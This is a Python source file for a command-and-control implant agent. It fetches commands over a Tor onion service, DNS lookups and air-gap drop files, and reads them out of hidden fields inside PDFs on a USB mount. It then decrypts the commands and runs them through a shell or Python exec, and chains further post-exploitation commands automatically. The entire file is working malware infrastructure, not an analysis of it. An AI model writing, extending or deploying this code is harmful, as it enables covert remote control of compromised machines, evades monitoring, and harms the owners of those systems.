#!/usr/bin/env python3
# Ruta: modules/c2/agent_receiver.py

import os
import json
import base64
import hashlib
import socket
import subprocess
import time
import uuid
import requests
import importlib.util
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Hash import HMAC, SHA256
from Crypto.Util.Padding import unpad
from urllib.parse import urlparse
import re

AGENT_ID = socket.gethostname()
MAC_WHITELIST = ["00:1A:2B:3C:4D:5E", "02:42:ac:11:00:02"]  # Update accordingly
QUEUE_FILE = f"c2/queues/{AGENT_ID}.queue"
RESULTS_DIR = "results"
EXEC_LOG = f"{RESULTS_DIR}/agent_exec_log_{AGENT_ID}.jsonl"
STIX_OUT = f"{RESULTS_DIR}/stix_exec_{AGENT_ID}.json"
KEY_ENV = "C2_AES_KEY"
HMAC_ENV = "C2_HMAC_KEY"
DASHBOARD_WS = "ws://localhost:8765"
REVERSE_POLL_INTERVAL = 10
TOR_PROXY = "socks5h://127.0.0.1:9050"
TOR_URL = f"http://agentreceiver.onion/recv?agent={AGENT_ID}"
DNS_DOMAIN = "agentcmd.example.com"
RF_DIR = "/tmp/rf_dropzone/"
PDF_DROP_DIR = "/mnt/usb_stego/"
CHAIN_POSTEX = True
AIRGAP_FILE = f"{RF_DIR}/{AGENT_ID}.bin"

os.makedirs("c2/queues", exist_ok=True)
os.makedirs(RESULTS_DIR, exist_ok=True)
os.makedirs(RF_DIR, exist_ok=True)

def is_mac_allowed():
    for iface in os.listdir('/sys/class/net/'):
        try:
            with open(f'/sys/class/net/{iface}/address') as f:
                mac = f.read().strip()
                if mac in MAC_WHITELIST:
                    return True
        except:
            continue
    return False

def decrypt_command(payload, key, hmac_key=None):
    decoded = base64.b64decode(payload)
    iv = decoded[:16]
    ct = decoded[16:-32] if hmac_key else decoded[16:]
    hmac_val = decoded[-32:] if hmac_key else None
    if hmac_key:
        h = HMAC.new(hmac_key.encode(), digestmod=SHA256)
        h.update(iv + ct)
        h.verify(hmac_val)
    cipher = AES.new(hashlib.sha256(key.encode()).digest(), AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(ct), AES.block_size).decode()

def execute_command(cmd):
    if cmd.startswith("run_module:"):
        path = cmd.split(":", 1)[1]
        if not os.path.isfile(path): return f"[ERR] No such module {path}"
        try:
            spec = importlib.util.spec_from_file_location("mod", path)
            mod = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(mod)
            return mod.main() if hasattr(mod, "main") else "[ERR] No main()"
        except Exception as e:
            return f"[ERR] Module error: {e}"
    elif cmd.startswith("exec_py:"):
        try:
            local_vars = {}
            exec(cmd.split(":", 1)[1], {}, local_vars)
            return local_vars.get("output", "[+] Executed")
        except Exception as e:
            return f"[ERR] Python exec failed: {e}"
    try:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=30).decode()
    except subprocess.CalledProcessError as e:
        return e.output.decode()
    except Exception as e:
        return str(e)

def log_execution(cmd, result):
    entry = {
        "timestamp": datetime.utcnow().isoformat(),
        "agent_id": AGENT_ID,
        "command": cmd,
        "output": result
    }
    with open(EXEC_LOG, "a") as f:
        f.write(json.dumps(entry) + "\n")
    push_to_dashboard(entry)

def push_to_dashboard(entry):
    try:
        import websockets
        import asyncio
        async def send_msg():
            async with websockets.connect(DASHBOARD_WS) as ws:
                await ws.send(json.dumps({
                    "type": "execution",
                    "agent": AGENT_ID,
                    "payload": entry
                }))
        asyncio.run(send_msg())
    except:
        pass

def export_stix(cmd, result):
    bundle = {
        "type": "bundle",
        "id": f"bundle--{uuid.uuid4()}",
        "objects": [{
            "type": "observed-data",
            "id": f"observed-data--{uuid.uuid4()}",
            "created": datetime.utcnow().isoformat(),
            "modified": datetime.utcnow().isoformat(),
            "number_observed": 1,
            "first_observed": datetime.utcnow().isoformat(),
            "last_observed": datetime.utcnow().isoformat(),
            "x_exec": {
                "agent": AGENT_ID,
                "command": cmd,
                "output": result
            }
        }]
    }
    with open(STIX_OUT, "w") as f:
        json.dump(bundle, f, indent=2)

def try_postex_chain(cmd, output):
    try:
        import copilot.suggestion_engine as se
        suggestions = se.suggest_next(cmd, output)
        for s in suggestions:
            result = execute_command(s)
            log_execution(s, result)
    except:
        pass

def process_queue():
    if not os.path.exists(QUEUE_FILE): return
    with open(QUEUE_FILE, "r") as f:
        lines = f.readlines()
    os.remove(QUEUE_FILE)
    key = os.environ.get(KEY_ENV)
    hmac_key = os.environ.get(HMAC_ENV)
    for line in lines:
        cmd = line.strip()
        if key:
            try: cmd = decrypt_command(cmd, key, hmac_key)
            except: continue
        result = execute_command(cmd)
        log_execution(cmd, result)
        export_stix(cmd, result)
        if CHAIN_POSTEX: try_postex_chain(cmd, result)

def check_tor():
    try:
        r = requests.get(TOR_URL, proxies={"http": TOR_PROXY}, timeout=10)
        return r.text.strip() if r.status_code == 200 else None
    except:
        return None

def check_dns():
    try:
        query = f"{AGENT_ID}.{DNS_DOMAIN}"
        out = subprocess.check_output(["nslookup", query], stderr=subprocess.DEVNULL).decode()
        match = re.search(r"Address: (\d+\.\d+\.\d+\.\d+)", out)
        if match:
            encoded = match.group(1).replace(".", "")
            return base64.b64decode(encoded).decode()
    except:
        return None

def check_rf():
    path = os.path.join(RF_DIR, f"{AGENT_ID}.rf")
    if os.path.exists(path):
        with open(path, "r") as f:
            cmd = f.read().strip()
        os.remove(path)
        return cmd
    return None

def check_pdf_drop():
    for f in os.listdir(PDF_DROP_DIR):
        if f.endswith(".pdf"):
            try:
                content = open(os.path.join(PDF_DROP_DIR, f), "rb").read()
                match = re.search(b"/HiddenCmd\s*\(([^)]+)\)", content)
                if match:
                    return base64.b64decode(match.group(1)).decode()
            except:
                continue
    return None

def check_airgap_file():
    if os.path.exists(AIRGAP_FILE):
        with open(AIRGAP_FILE, "rb") as f:
            raw = f.read()
        os.remove(AIRGAP_FILE)
        try:
            return base64.b64decode(raw).decode()
        except:
            return raw.decode()

def poll_reverse():
    key = os.environ.get(KEY_ENV)
    hmac_key = os.environ.get(HMAC_ENV)
    for source in [check_tor, check_dns, check_rf, check_pdf_drop, check_airgap_file]:
        raw = source()
        if raw:
            try:
                cmd = decrypt_command(raw, key, hmac_key) if key else raw
                result = execute_command(cmd)
                log_execution(cmd, result)
                export_stix(cmd, result)
                if CHAIN_POSTEX: try_postex_chain(cmd, result)
            except:
                continue

def main_loop():
    if not is_mac_allowed():
        print("[!] MAC address not allowed.")
        return
    print(f"[+] Agent receiver running: {AGENT_ID}")
    while True:
        process_queue()
        poll_reverse()
        time.sleep(REVERSE_POLL_INTERVAL)

if __name__ == "__main__":
    main_loop()
